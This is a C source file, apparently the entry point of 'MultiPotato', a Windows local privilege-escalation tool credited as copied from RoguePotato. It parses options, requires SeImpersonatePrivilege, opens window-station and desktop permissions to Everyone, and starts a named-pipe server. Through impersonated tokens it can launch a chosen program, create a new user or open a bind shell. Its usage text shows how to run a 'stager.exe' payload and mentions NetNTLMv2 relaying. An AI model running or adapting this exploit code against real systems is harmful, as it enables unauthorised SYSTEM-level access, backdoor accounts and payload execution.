#include "Windows.h"
#include "stdio.h"
#include <time.h>
#include "common.h"

#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

//global variables
wchar_t* commandline = NULL;
wchar_t* arguments = NULL;
wchar_t* pipe_placeholder = NULL;
wchar_t* clsid_string;
char gtechnique[MAX_PATH];
bool endless = false;
wchar_t WinStationName[256];

//functions
void SetWinDesktopPerms();


int wmain(int argc, wchar_t** argv)
{
	//init default values
	wchar_t* technique_placeholder = (wchar_t*)TECHNIQUE_NAME;
	pipe_placeholder = (wchar_t*)PIPE_NAME;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{

		case 'e':
			++argv;
			--argc;
			commandline = argv[1];
			break;

		case 'p':
			++argv;
			--argc;
			pipe_placeholder = argv[1];
			break;

		case 't':
			++argv;
			--argc;
			technique_placeholder = argv[1];
			break;

		case 'a':
			++argv;
			--argc;
			arguments = argv[1];
			break;

		case 'n':
			++argv;
			--argc;
			endless = true;
			break;

		case 'h':
			Usage();
			exit(100);
			break;

		default:
			wprintf(L"Wrong Argument: %s\n", argv[1]);
			Usage();
			exit(-1);
		}
		++argv;
		--argc;
	}

	if (commandline == NULL && ((lstrcmpW(technique_placeholder, L"CreateProcessAsUserW") == 0) || (lstrcmpW(technique_placeholder, L"CreateProcessWithTokenW") == 0)))
	{
		Usage();
		exit(-1);
	}

	
	
	printf("[+] Starting Pipeserver...\n");
	MultiPotato(commandline, technique_placeholder, arguments);
	return 0;
}

void MultiPotato(wchar_t *commandline, wchar_t *technique_placeholder, wchar_t* arguments) {
	DWORD threadId;
	LPWSTR technique;
	if (!EnablePriv(NULL, SE_IMPERSONATE_NAME))
	{
		wprintf(L"[-] A privilege is missing: '%ws'. Exiting ...\n", SE_IMPERSONATE_NAME);
		exit(-1);
	}
	
	SetWinDesktopPerms();
	technique = (LPWSTR)technique_placeholder;
	CreatePipeServer(technique, endless);
}

void Usage()
{
	printf("\n\n\tMultiPotato\n\t@shitsecure, code stolen from @splinter_code's && @decoder_it's RoguePotato (https://github.com/antonioCoco/RoguePotato) \n\n\n");

	printf("Mandatory args: \n"
		"-e commandline: commandline of the program to launch\n"
	);

	printf("\n\n");
	printf("Optional args: \n"
		"-t technique: Choose from CreateUser, CreateProcessWithTokenW or CreateProcessAsUserW, BindShell (default: CresteProcessWithTokenW)\n"
		"-a : arguments to run the binary with\n"
		"-n : endless mode - restart the Named Pipe Server after execution - can be used in combination with NetNTLMv2 relaying.\n"
	);

	printf("\n\n");
	printf("Example to create a new User: \n"
		"\tMultiPotato.exe -t CreateUser\n"
	);

	printf("\n\n");
	printf("Example to execute stager.exe via CreateProcessAsUserW: \n"
		"\tMultiPotato.exe -e \"C:\\temp\\stager.exe\" -t CreateProcessAsUserW\n"
	);
}



void SetWinDesktopPerms()
{
	HWINSTA hwinstaold = GetProcessWindowStation();
	DWORD lengthNeeded;
	memset(WinStationName, 0, sizeof(WinStationName));
	GetUserObjectInformationW(hwinstaold, UOI_NAME, WinStationName, 256, &lengthNeeded);



	HWINSTA hwinsta = OpenWindowStationW(WinStationName, FALSE, READ_CONTROL | WRITE_DAC);

	if (!SetProcessWindowStation(hwinsta))
		printf("[-] Error SetProcessWindowStation:%d\n", GetLastError());

	HDESK hdesk = OpenDesktop(
		L"default",
		0,
		FALSE,
		READ_CONTROL | WRITE_DAC |
		DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS
	);
	if (hdesk == NULL)
		printf("[-] Error open Desktop:%d\n", GetLastError());
	if (!SetProcessWindowStation(hwinstaold))
		printf("[-] Error SetProcessWindowStation2:%d\n", GetLastError());


	PSID psid = BuildEveryoneSid();
	//printf("psid=%0x\n", psid);
	if (!AddTheAceWindowStation(hwinstaold, psid))
		printf("[-] Error add Ace Station:%d\n", GetLastError());
	if (!AddTheAceDesktop(hdesk, psid))
		printf("[-] Error add Ace desktop:%d\n", GetLastError());
	//free(psid);
	CloseWindowStation(hwinsta);

	CloseDesktop(hdesk);
}